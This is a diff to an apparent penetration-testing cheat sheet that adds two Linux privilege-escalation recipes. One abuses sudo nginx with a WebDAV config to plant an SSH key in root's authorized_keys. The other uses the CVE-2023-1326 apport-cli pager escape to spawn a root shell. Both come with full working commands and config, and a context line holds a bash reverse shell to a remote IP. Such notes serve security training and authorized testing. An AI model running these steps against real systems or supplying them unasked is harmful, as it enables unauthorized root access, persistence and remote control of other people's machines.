@@ -594,6 +594,64 @@ bash -i >& /dev/tcp/10.13.22.22/1111 0>&1
 * We then use our `sudo -l` privlages to restart the service
 * ![alt text](https://miro.medium.com/max/2400/1\*JZqSzROFnTD6fNHWEHGSpw.png)
 
+### Nginx Sudo Privilege Escalation (WebDAV Method)
+
+If you can run `sudo /usr/sbin/nginx` (NOPASSWD), exploit via custom config with WebDAV to write files as root.
+
+**Detection:**
+
+```bash
+sudo -l
+# (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+```
+
+**Create malicious nginx config (`/tmp/nginx_pwn.conf`):**
+
+```nginx
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+        listen 1339;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}
+```
+
+**Exploitation:**
+
+```bash
+# 1. Start nginx with malicious config
+sudo /usr/sbin/nginx -c /tmp/nginx_pwn.conf
+
+# 2. Verify it's running
+netstat -antpu | grep 1339
+
+# 3. Generate SSH key (if needed)
+ssh-keygen -t ed25519
+
+# 4. Write SSH key to root's authorized_keys
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"
+
+# 5. SSH as root
+ssh root@localhost -i ~/.ssh/id_ed25519
+```
+
+**One-liner (from attacker box with existing key):**
+
+```bash
+curl -X PUT TARGET:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"
+ssh root@TARGET -i ~/.ssh/id_ed25519
+```
+
+**Reference:** https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
+
 ### SUID SYMLINKS CVE-2016-1247
 
 * Detection
@@ -1460,6 +1518,52 @@ echo "cp /bin/bash /home/sysadmin/bash && chmod u+s /home/sysadmin/bash" >> 00-h
 ```
 
 * now log out and re-ssh in to kick it off and then execute bash with `bash -p`
+
+### CVE-2023-1326 - apport-cli Privilege Escalation
+
+`apport-cli` uses `less` as a pager which allows command execution when run with sudo.
+
+**Detection:**
+
+```bash
+sudo -l
+# (ALL : ALL) /usr/bin/apport-cli
+```
+
+**Vulnerable versions:** apport-cli 2.26.0 and earlier
+
+**Exploitation:**
+
+```bash
+# 1. Create a crash file (if none exists)
+sleep 9999 &
+kill -SEGV $!
+
+# 2. Verify crash file created
+ls -la /var/crash/
+# -rw-r----- 1 user user 33073 ... _usr_bin_sleep.1000.crash
+
+# 3. Run apport-cli with sudo
+sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
+
+# 4. When prompted, press 'V' to view report (opens less pager)
+# 5. In less, type:
+!/bin/bash
+
+# 6. Root shell spawns
+```
+
+**Alternative - use existing crash:**
+
+```bash
+# Find existing crash files
+find / -type f -name "*.crash" 2>/dev/null
+
+# Use any crash file
+sudo /usr/bin/apport-cli -c /var/crash/existing.crash
+```
+
+**Reference:** https://github.com/diego-tella/CVE-2023-1326-PoC
 
 ### Pkexec as SUID
 
